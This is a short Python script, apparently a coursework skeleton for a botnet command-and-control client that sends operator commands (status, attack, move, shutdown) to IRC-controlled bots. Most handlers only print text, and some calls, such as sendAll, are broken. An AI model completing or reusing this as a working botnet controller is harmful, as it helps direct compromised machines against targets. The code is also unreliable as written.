import socketserver
import socket
import os
import sys

def do_status(client, args):
    global secret
    client.sendAll(secret + ', show')
    botList = client.recv(16).decode('utf-8')
    print(botList)

def do_attack(client, args):
    print("attack", args[1], args[2])

def do_move(client, args):
    print("bots connect to the new IRC server")

def do_quit(client, args):
    client.close()

def do_shutdown(client, args):
    print("shutdown the bots")


# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'status':do_status,
    'attack':do_attack,
    'move':do_move,
    'quit':do_quit,
    'shutdown':do_shutdown
}

secret = None

if __name__ == "__main__":
    HOST = sys.argv[1]
    srcPort = int(sys.argv[2])
    channel = sys.argv[3]
    secret = sys.argv[4]
    
    try:
        while True:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST,srcPort))
            while True:
                # Recieve data from client
                data = input("Please enter your command:")
                # Interpret user info by matching it with one of the definitions in the variable
                args = data.split()
#                if args[0] == "off":
#                    do_off(server,client_socket,args)
#                elif args[0] == "logout":
#                    do_logout(client_socket,args)
#                    loggedIn = False
#                    break
#                else:
                if not args[0] in interpretInput:
                    print('No such command\n')
                else:
                    interpretInput[args[0]](client,args)
    except Exception as err:
        print(err)

# close clients socket
client.close()
# terminate the program
sys.exit()




